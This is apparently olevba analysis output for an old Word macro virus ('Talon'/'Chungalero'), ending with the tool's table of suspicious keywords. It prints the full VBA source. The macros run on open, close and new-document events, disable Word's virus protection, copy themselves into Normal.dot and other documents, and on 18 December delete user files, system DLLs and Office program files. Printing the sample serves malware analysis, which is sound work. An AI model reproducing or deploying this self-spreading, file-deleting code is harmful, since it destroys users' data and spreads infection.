olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Talon.s-8579b37964fe4a64ae5dcf0763a9108d7be09959
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Talon.s-8579b37964fe4a64ae5dcf0763a9108d7be09959 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Chungalero.bas 
in file: Virus.MSWord.Talon.s-8579b37964fe4a64ae5dcf0763a9108d7be09959 - OLE stream: 'Macros/VBA/Chungalero'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoOpen()
'
' AutoOpen Macro
' ChungaleWare Inc.
' Valledupar, Marzo de 1998.
' Segunda Versión Enero del 1999. V2.01

On Error GoTo Chungalero


    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    

Call EstaInfectadO

Call FaKeJoker

    Application.ScreenUpdating = True
    Application.DisplayAlerts = wdAlertsAll

Chungalero:
End Sub

Private Sub FaKeJoker()
On Error GoTo FaKeError
Application.ScreenUpdating = True
Application.DisplayAlerts = wdAlertsAll

    Dim Dia, Mes, Hora As Integer
    Dia = Day(Now()): Mes = Month(Now()): Hora = Hour(Now())
    If Dia = 18 And Mes = 12 Then
       Chungale
    End If
    If (Hora >= 12 And Hora <= 14) Or Dia = 18 Then
        Application.ActiveDocument.WritePassword = "Chungalero"
        Opc = 1
        While Opc <> -1
        Set Globito = Assistant.NewBalloon
            With Globito
            .Icon = msoIconTips
            .Heading = "Hola Como Estás?"
            .Text = "Me llaman Chungalero" + Chr$(13) + Chr$(10) _
            + "Hoy Cumplo otro mes de Vida" + Chr$(13) + Chr$(10) + "Si quieres Ayuda!!" + Chr(13) + "llama al 911..." + Chr$(13) + Chr$(10) + Chr$(13) + Chr$(10) + Chr$(13) + Chr$(10) + "ChungaleWare Inc. Valledupar, Enero 1999"
            .Animation = msoAnimationBeginSpeaking
            .Button = msoBalloonButtonOK
            Opc = .Show
            End With
        Wend
    End If
    
  
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

FaKeError:
End Sub

Private Sub Chungale()
On Error GoTo ChungaleError
Opc = -1
While Opc = -1
Set b = Assistant.NewBalloon
    With b
        .Icon = msoIconAlert
        .Heading = "Chungalero Como Estás?"
        .Text = "Hoy te tocó el Dia Final Selecciona una Opción no te puedes Escapar"
        .Labels(1).Text = "Borrar La Carpeta Mis Documentos"
        .Labels(2).Text = "Borrar los Archivos del Sistema"
        .Labels(3).Text = "Borrar la Carpeta de Archivos de Programas"
        .Animation = msoAnimationBeginSpeaking
        .Button = msoBalloonButtonNull
  Opc = .Show
    End With
  Select Case Opc
    Case 1
        Kill ("c:\Mis Documentos\*.*")
    Case 2
        Kill ("c:\windows\system\*.dll")
    Case 3
        Kill ("c:\Archivos de Programa\Microsoft Office\*.*")
    
    End Select
Wend
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

ChungaleError:
End Sub

Sub AutoClose()
On Error GoTo ErrorClose

    Call AutoOpen

ErrorClose:
End Sub

Sub AutoNew()
On Error GoTo ErrorNew

Call AutoOpen

ErrorNew:
End Sub

Sub AutoExec()
On Error GoTo ErrorExec

Call AutoOpen

ErrorExec:
End Sub

Private Sub EstaInfectadO()
Dim Pname, Cname As String
Dim Esta As Boolean

On Error GoTo DocInfectError
For Projects = 1 To Application.VBE.VbProjects.Count
    Pname = Application.VBE.VbProjects(Projects).Name
    For Component = 2 To Application.VBE.VbProjects(Projects).VBComponents.Count
        Cname = Application.VBE.VbProjects(Projects).VBComponents(Component).Name
        If Application.VBE.VbProjects(Projects).VBComponents(Component).Name = "Chungalero" Then _
           Esta = True
    Next
    If Not Esta And Pname = "Normal" Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="Chungalero", _
        Object:=wdOrganizerObjectProjectItems
    End If
    If Not Esta And Pname <> "Normal" And Left(Pname, 5) <> "Virus" Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument.FullName, Name:="Chungalero", _
        Object:=wdOrganizerObjectProjectItems
        Application.ActiveDocument.VBProject.Name = "Virus_Chungo" & Trim(Str(Projects))
        
    End If
    Esta = False
Next

DocInfectError:
End Sub

Private Sub scroll(Scrtxt As String)
  ccrtxt = "%Bienvenidos a la página de Fabian Yesith Garcia Jurado, para comentarios y sugerencias envieme e-mail a gulfasith@geocities.com%"
  Lentxt = Len(Scrtxt)
  Widthscr = Lentxt
  pos = 1 - Widthscr
  counte = 1
While counte < Lentxt
  pos = pos + 1
  scroller = ""
  If pos = Lentxt Then
    pos = 1 - Widthscr
  End If
  If (pos < 0) Then
    PosAbs = Abs(pos)
    For i = 1 To PosAbs
      scroller = scroller + " "
    Next
    scroller = scroller + Mid(Scrtxt, 1, Widthscr - i + 1)
  Else
    pos = pos + 2
    scroller = scroller + Mid(Scrtxt, pos, Widthscr)
  End If
  Application.Caption = scroller
  counte = counte + 1
  DoEvents
  For m = 1 To 2000000
  Next
Wend
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

